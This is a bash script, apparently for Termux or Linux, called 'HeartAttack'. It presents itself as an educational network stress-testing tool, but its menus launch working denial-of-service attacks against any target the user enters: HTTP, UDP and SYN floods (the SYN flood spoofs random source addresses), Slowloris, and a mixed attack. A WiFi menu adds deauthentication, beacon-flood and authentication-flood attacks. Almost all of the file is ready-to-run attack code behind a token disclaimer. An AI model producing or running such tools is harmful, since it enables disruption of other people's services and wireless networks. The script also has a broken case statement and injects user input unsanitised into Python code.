#!/data/data/com.termux/files/usr/bin/bash

# HeartAttack - Network Stress Testing Tool
# Created for educational purposes only

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
PINK='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Check if running on Termux
if [ -d "/data/data/com.termux/files/usr" ]; then
    IS_TERMUX=true
else
    IS_TERMUX=false
fi

# Install required packages
install_requirements() {
    echo -e "${YELLOW}[*] Installing required packages...${NC}"
    
    if [ "$IS_TERMUX" = true ]; then
        pkg update -y
        pkg install -y python figlet curl git python3 python-pip
        pip install --upgrade pip
        pip install requests scapy
    else
        sudo apt-get update
        sudo apt-get install -y python3 python3-pip figlet curl git
        pip3 install requests scapy
    fi
    
    # Install lolcat if available
    if [ "$IS_TERMUX" = true ]; then
        pkg install -y ruby || true
        gem install lolcat 2>/dev/null || echo -e "${YELLOW}[!] lolcat not installed, continuing without it${NC}"
    else
        sudo gem install lolcat 2>/dev/null || echo -e "${YELLOW}[!] lolcat not installed, continuing without it${NC}"
    fi
    
    echo -e "${GREEN}[+] Requirements installed${NC}"
    sleep 2
}

# Show banner
show_banner() {
    clear
    if command -v lolcat &> /dev/null && command -v figlet &> /dev/null; then
        figlet "HeartAttack" | lolcat
    else
        echo -e "${PINK}"
        echo "  _   _               _   _             _    _"
        echo " | | | | ___  ___ ___| |_| |_ __ _  ___| | _| |_ ___"
        echo " | |_| |/ _ \/ __/ __| __| __/ _\` |/ __| |/ / __/ __|"
        echo " |  _  |  __/\__ \__ \ |_| || (_| | (__|   <| |_\__ \\"
        echo " |_| |_|\___||___/___/\__|\__\__,_|\___|_|\_\\\__|___/"
        echo -e "${NC}"
    fi
    echo -e "${PINK}         Network Stress Testing Tool ${NC}"
    echo -e "${RED}        For Educational Purposes Only ${NC}"
    echo -e "${YELLOW}===============================================${NC}"
}

# Check requirements
check_requirements() {
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}[!] Python3 is not installed${NC}"
        install_requirements
    fi
    
    if [ "$IS_TERMUX" = true ] && ! command -v figlet &> /dev/null; then
        install_requirements
    fi
}

# Web Attack Methods
web_attack() {
    while true; do
        clear
        show_banner
        echo -e "${CYAN}"
        echo "    ╔════════════════════════════╗"
        echo "    ║        WEB ATTACK          ║"
        echo "    ╚════════════════════════════╝${NC}"
        echo -e "${YELLOW}"
        echo "  [1] HTTP Flood Attack"
        echo "  [2] Slowloris Attack"
        echo "  [3] UDP Flood Attack"
        echo "  [4] SYN Flood Attack"
        echo "  [5] Mixed Attack (All Methods)"
        echo "  [6] Back to Main Menu"
        echo -e "${NC}"
        echo -e "${YELLOW}===============================================${NC}"
        read -p "Select option [1-6]: " web_choice

        case $web_choice in 1
                read -p "Enter target URL/IP: " target
                read -p "Enter port (default 80): " port
                read -p "Enter duration (seconds): " duration
                read -p "Enter threads (default 500): " threads
                port=${port:-80}
                threads=${threads:-500}
                echo -e "${RED}[!] Starting HTTP Flood Attack on $target${NC}"
                python3 -c "
import requests
import threading
import time
import random

target = '$target'
port = $port
duration = $duration
threads = $threads

timeout = time.time() + duration
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/615.1'
]

def http_flood():
    while time.time() < timeout:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
            response = requests.get('http://' + target, headers=headers, timeout=5)
            print(f'Request sent to {target}, Status: {response.status_code}')
        except:
            print(f'Error connecting to {target}')
        time.sleep(0.01)

print(f'Starting HTTP Flood with {threads} threads for {duration} seconds')
for i in range(threads):
    thread = threading.Thread(target=http_flood)
    thread.daemon = True
    thread.start()

time.sleep(duration)
print('Attack finished')
"
                ;;
            2)
                read -p "Enter target URL/IP: " target
                read -p "Enter port (default 80): " port
                read -p "Enter duration (seconds): " duration
                read -p "Enter sockets (default 1000): " sockets
                port=${port:-80}
                sockets=${sockets:-1000}
                echo -e "${RED}[!] Starting Slowloris Attack on $target${NC}"
                python3 -c "
import socket
import threading
import time
import random

target = '$target'
port = $port
duration = $duration
sockets = $sockets

timeout = time.time() + duration

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        
        # Send incomplete HTTP request
        s.send(f'GET / HTTP/1.1\r\nHost: {target}\r\n'.encode())
        s.send('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n'.encode())
        s.send('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'.encode())
        # Don't complete the request
        return s
    except:
        return None

def slowloris():
    socket_list = []
    print('Creating sockets...')
    
    for i in range(sockets):
        if time.time() > timeout:
            break
        s = create_socket()
        if s:
            socket_list.append(s)
            print(f'Created socket {i+1}/{sockets}')
    
    print('Sending keep-alive headers...')
    while time.time() < timeout:
        for s in socket_list:
            try:
                s.send(f'X-a: {random.randint(1, 5000)}\r\n'.encode())
                print('Sent keep-alive header')
            except:
                print('Socket closed, recreating...')
                socket_list.remove(s)
                new_s = create_socket()
                if new_s:
                    socket_list.append(new_s)
        time.sleep(15)
    
    for s in socket_list:
        try:
            s.close()
        except:
            pass

print(f'Starting Slowloris attack with {sockets} sockets')
slowloris()
print('Attack finished')
"
                ;;
            3)
                read -p "Enter target IP: " target
                read -p "Enter port: " port
                read -p "Enter duration (seconds): " duration
                echo -e "${RED}[!] Starting UDP Flood Attack on $target${NC}"
                python3 -c "
import socket
import random
import threading
import time

target = '$target'
port = $port
duration = $duration

timeout = time.time() + duration

def udp_flood():
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            sock.sendto(bytes, (target, port))
            print(f'UDP packet sent to {target}:{port}')
        except Exception as e:
            print(f'Error: {e}')
        time.sleep(0.01)

print('Starting UDP Flood attack')
for i in range(500):
    thread = threading.Thread(target=udp_flood)
    thread.daemon = True
    thread.start()

time.sleep(duration)
print('Attack finished')
"
                ;;
            4)
                read -p "Enter target IP: " target
                read -p "Enter port: " port
                read -p "Enter duration (seconds): " duration
                echo -e "${RED}[!] Starting SYN Flood Attack on $target${NC}"
                python3 -c "
from scapy.all import *
import random
import time

target = '$target'
port = $port
duration = $duration

timeout = time.time() + duration

def syn_flood():
    while time.time() < timeout:
        try:
            # Generate random source IP
            src_ip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
            
            # Create IP packet
            ip = IP(src=src_ip, dst=target)
            
            # Create TCP SYN packet
            tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags='S', seq=random.randint(1000, 100000))
            
            # Send packet
            send(ip/tcp, verbose=0)
            print(f'SYN packet sent from {src_ip} to {target}:{port}')
        except Exception as e:
            print(f'Error: {e}')
        time.sleep(0.01)

print('Starting SYN Flood attack')
syn_flood()
print('Attack finished')
"
                ;;
            5)
                read -p "Enter target URL/IP: " target
                read -p "Enter port (default 80): " port
                read -p "Enter duration (seconds): " duration
                port=${port:-80}
                echo -e "${RED}[!] Starting Mixed Attack on $target${NC}"
                echo -e "${YELLOW}[*] This will use all available methods${NC}"
                python3 -c "
import requests
import socket
import threading
import time
import random

target = '$target'
port = $port
duration = $duration

timeout = time.time() + duration
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
]

# HTTP Flood function
def http_flood():
    while time.time() < timeout:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.get('http://' + target, headers=headers, timeout=2)
            print(f'HTTP Request to {target}, Status: {response.status_code}')
        except:
            print(f'HTTP Error to {target}')
        time.sleep(0.01)

# UDP Flood function
def udp_flood():
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            sock.sendto(bytes, (target, port))
            print(f'UDP packet to {target}:{port}')
        except:
            print(f'UDP Error to {target}')
        time.sleep(0.01)

# Slowloris function
def slowloris():
    socket_list = []
    for i in range(200):
        if time.time() > timeout:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f'GET / HTTP/1.1\r\nHost: {target}\r\n'.encode())
            socket_list.append(s)
            print(f'Slowloris socket {i+1} created')
        except:
            pass
    
    while time.time() < timeout:
        for s in socket_list:
            try:
                s.send(f'X-a: {random.randint(1, 5000)}\r\n'.encode())
                print('Slowloris keep-alive sent')
            except:
                pass
        time.sleep(15)

print('Starting Mixed attack with all methods')
# Start all attacks
threading.Thread(target=http_flood, daemon=True).start()
threading.Thread(target=udp_flood, daemon=True).start()
threading.Thread(target=slowloris, daemon=True).start()

time.sleep(duration)
print('Attack finished')
"
                ;;
            6)
                return
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 1
                ;;
        esac
        
        echo -e "${GREEN}"
        read -p "Press Enter to continue..."
        echo -e "${NC}"
    done
}

# WiFi Attack Methods
wifi_attack() {
    while true; do
        clear
        show_banner
        echo -e "${CYAN}"
        echo "    ╔════════════════════════════╗"
        echo "    ║        WIFI ATTACK         ║"
        echo "    ╚════════════════════════════╝${NC}"
        echo -e "${YELLOW}"
        echo "  [1] Deauthentication Attack"
        echo "  [2] Beacon Flood Attack"
        echo "  [3] Authentication Flood Attack"
        echo "  [4] WiFi Stress Test"
        echo "  [5] Back to Main Menu"
        echo -e "${NC}"
        echo -e "${YELLOW}===============================================${NC}"
        read -p "Select option [1-5]: " wifi_choice

        case $wifi_choice in
            1)
                if [ "$IS_TERMUX" = false ]; then
                    echo -e "${RED}[!] This attack requires monitor mode${NC}"
                    echo -e "${YELLOW}[*] Make sure your WiFi card supports monitor mode${NC}"
                    read -p "Enter network interface (e.g., wlan0): " interface
                    read -p "Enter target BSSID: " bssid
                    read -p "Enter duration (seconds): " duration
                    echo -e "${RED}[!] Starting Deauthentication Attack${NC}"
                    sudo aireplay-ng --deauth $duration -a $bssid $interface
                else
                    echo -e "${RED}[!] This attack is not available on Termux${NC}"
                    echo -e "${YELLOW}[*] Use a Linux system with monitor mode support${NC}"
                fi
                ;;
            2)
                read -p "Enter network SSID to impersonate: " ssid
                read -p "Enter number of fake APs: " count
                read -p "Enter duration (seconds): " duration
                echo -e "${RED}[!] Starting Beacon Flood Attack${NC}"
                python3 -c "
from scapy.all import *
import time
import random

ssid = '$ssid'
count = $count
duration = $duration

timeout = time.time() + duration

def beacon_flood():
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                 addr2=f'{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}',
                 addr3=f'{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}')
    
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    
    frame = RadioTap()/dot11/beacon/essid
    
    while time.time() < timeout:
        sendp(frame, iface='wlan0' if '$IS_TERMUX' == 'false' else 'wlan0', verbose=0)
        print(f'Beacon frame sent for SSID: {ssid}')
        time.sleep(0.1)

print('Starting Beacon Flood attack')
beacon_flood()
print('Attack finished')
"
                ;;
            3)
                read -p "Enter target BSSID: " bssid
                read -p "Enter duration (seconds): " duration
                echo -e "${RED}[!] Starting Authentication Flood Attack${NC}"
                python3 -c "
from scapy.all import *
import time
import random

bssid = '$bssid'
duration = $duration

timeout = time.time() + duration

def auth_flood():
    while time.time() < timeout:
        try:
            # Generate random MAC
            client_mac = f'{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}'
            
            # Create authentication request
            dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=client_mac, addr3=bssid)
            auth = Dot11Auth(algo=0, seqnum=1, status=0)
            
            frame = RadioTap()/dot11/auth
            
            sendp(frame, iface='wlan0' if '$IS_TERMUX' == 'false' else 'wlan0', verbose=0)
            print(f'Authentication request sent from {client_mac} to {bssid}')
        except Exception as e:
            print(f'Error: {e}')
        time.sleep(0.1)

print('Starting Authentication Flood attack')
auth_flood()
print('Attack finished')
"
                ;;
            4)
                read -p "Enter target IP range (e.g., 192.168.1.0/24): " ip_range
                read -p "Enter duration (seconds): " duration
                echo -e "${RED}[!] Starting WiFi Stress Test${NC}"
                python3 -c "
import threading
import subprocess
import time

ip_range = '$ip_range'
duration = $duration

timeout = time.time() + duration

def ping_flood():
    while time.time() < timeout:
        try:
            # Ping the broadcast address
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip_range], 
                                  capture_output=True, text=True, timeout=2)
            if '1 received' in result.stdout:
                print(f'Host found in {ip_range}')
        except:
            pass
        time.sleep(0.1)

def arp_scan():
    while time.time() < timeout:
        try:
            # ARP scan the network
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            print('ARP scan completed')
            print(result.stdout)
        except:
            pass
        time.sleep(5)

print('Starting WiFi Stress Test')
threading.Thread(target=ping_flood, daemon=True).start()
threading.Thread(target=arp_scan, daemon=True).start()

time.sleep(duration)
print('Test finished')
"
                ;;
            5)
                return
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 1
                ;;
        esac
        
        echo -e "${GREEN}"
        read -p "Press Enter to continue..."
        echo -e "${NC}"
    done
}

# Main menu
main_menu() {
    while true; do
        clear
        show_banner
        echo -e "${CYAN}"
        echo "    ╔════════════════════════════╗"
        echo "    ║        MAIN MENU           ║"
        echo "    ╚════════════════════════════╝${NC}"
        echo -e "${YELLOW}"
        echo "  [1] WebAttack"
        echo "  [2] WifiAttack"
        echo "  [3] Install Requirements"
        echo "  [4] Exit"
        echo -e "${NC}"
        echo -e "${YELLOW}===============================================${NC}"
        read -p "Select option [1-4]: " main_choice

        case $main_choice in
            1)
                web_attack
                ;;
            2)
                wifi_attack
                ;;
            3)
                install_requirements
                ;;
            4)
                echo -e "${GREEN}[+] Thank you for using HeartAttack${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# Check if running as root
if [ "$IS_TERMUX" = false ] && [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Please run as root for full functionality${NC}"
    echo -e "${YELLOW}[*] Some features may not work without root privileges${NC}"
    sleep 3
fi

# Initial check and setup
check_requirements
main_menu
